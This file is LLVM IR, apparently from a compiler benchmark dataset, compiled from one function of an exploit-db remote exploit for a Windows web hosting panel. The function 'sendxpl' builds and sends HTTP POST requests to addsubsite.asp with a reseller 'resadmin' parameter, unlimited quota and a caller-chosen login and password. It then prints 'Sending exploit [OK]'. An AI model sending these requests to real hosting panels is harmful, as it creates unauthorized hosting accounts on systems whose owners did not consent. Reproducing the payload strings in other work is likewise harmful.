; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_987.c_sendxpl.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_987.c_sendxpl.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [518 x i8] c"POST /admin/hosting/addsubsite.asp HTTP/1.0\0AConnection: Keep-Alive\0APragma: no-cache\0ACache-control: no-cache\0AAccept: text/html, image/jpeg, image/png, text/*, image/*, */*\0AAccept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\0AAccept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\0AAccept-Language: en\0AHost: %s\0AContent-Type: application/x-www-form-urlencoded\0AContent-Length: %d\0A\0Areseller=resadmin&domaintypecheck=SECOND&DomainName=%s&loginname=%s&Quota=-1&htype=27&choice=1&mailaccess=TRUE&MailServerType=%s&password=%s\00", align 1
@.str.1 = private unnamed_addr constant [512 x i8] c"POST /hosting/addsubsite.asp HTTP/1.0\0AConnection: Keep-Alive\0APragma: no-cache\0ACache-control: no-cache\0AAccept: text/html, image/jpeg, image/png, text/*, image/*, */*\0AAccept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\0AAccept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\0AAccept-Language: en\0AHost: %s\0AContent-Type: application/x-www-form-urlencoded\0AContent-Length: %d\0A\0Areseller=resadmin&domaintypecheck=SECOND&DomainName=%s&loginname=%s&Quota=-1&htype=27&choice=1&mailaccess=TRUE&MailServerType=%s&password=%s\00", align 1
@.str.2 = private unnamed_addr constant [28 x i8] c"[*] Sending exploit\09\09[OK]\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @sendxpl(i32* %0, i8** %1, i32 %2) #0 {
  %4 = alloca i32*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i32* %0, i32** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 %2, i32* %6, align 4
  store i32 132, i32* %7, align 4
  %8 = load i8**, i8*** %5, align 8
  %9 = getelementptr inbounds i8*, i8** %8, i64 2
  %10 = load i8*, i8** %9, align 8
  %11 = call i64 @strlen(i8* %10)
  %12 = load i32, i32* %7, align 4
  %13 = sext i32 %12 to i64
  %14 = add nsw i64 %13, %11
  %15 = trunc i64 %14 to i32
  store i32 %15, i32* %7, align 4
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 3
  %18 = load i8*, i8** %17, align 8
  %19 = call i64 @strlen(i8* %18)
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %21, %19
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %7, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 4
  %26 = load i8*, i8** %25, align 8
  %27 = call i64 @strlen(i8* %26)
  %28 = load i32, i32* %7, align 4
  %29 = sext i32 %28 to i64
  %30 = add nsw i64 %29, %27
  %31 = trunc i64 %30 to i32
  store i32 %31, i32* %7, align 4
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 5
  %34 = load i8*, i8** %33, align 8
  %35 = call i64 @strlen(i8* %34)
  %36 = load i32, i32* %7, align 4
  %37 = sext i32 %36 to i64
  %38 = add nsw i64 %37, %35
  %39 = trunc i64 %38 to i32
  store i32 %39, i32* %7, align 4
  %40 = load i32, i32* %6, align 4
  %41 = icmp eq i32 %40, 1
  br i1 %41, label %42, label %61

42:                                               ; preds = %3
  %43 = load i32*, i32** %4, align 8
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = load i32, i32* %7, align 4
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 4
  %50 = load i8*, i8** %49, align 8
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 2
  %53 = load i8*, i8** %52, align 8
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 5
  %56 = load i8*, i8** %55, align 8
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 3
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @fprintf(i32* %43, i8* getelementptr inbounds ([518 x i8], [518 x i8]* @.str, i64 0, i64 0), i8* %46, i32 %47, i8* %50, i8* %53, i8* %56, i8* %59)
  br label %80

61:                                               ; preds = %3
  %62 = load i32*, i32** %4, align 8
  %63 = load i8**, i8*** %5, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 1
  %65 = load i8*, i8** %64, align 8
  %66 = load i32, i32* %7, align 4
  %67 = load i8**, i8*** %5, align 8
  %68 = getelementptr inbounds i8*, i8** %67, i64 4
  %69 = load i8*, i8** %68, align 8
  %70 = load i8**, i8*** %5, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 2
  %72 = load i8*, i8** %71, align 8
  %73 = load i8**, i8*** %5, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 5
  %75 = load i8*, i8** %74, align 8
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 3
  %78 = load i8*, i8** %77, align 8
  %79 = call i32 @fprintf(i32* %62, i8* getelementptr inbounds ([512 x i8], [512 x i8]* @.str.1, i64 0, i64 0), i8* %65, i32 %66, i8* %69, i8* %72, i8* %75, i8* %78)
  br label %80

80:                                               ; preds = %61, %42
  %81 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0))
  ret void
}

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @fprintf(i32*, i8*, i8*, i32, i8*, i8*, i8*, i8*) #1

declare dso_local i32 @printf(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
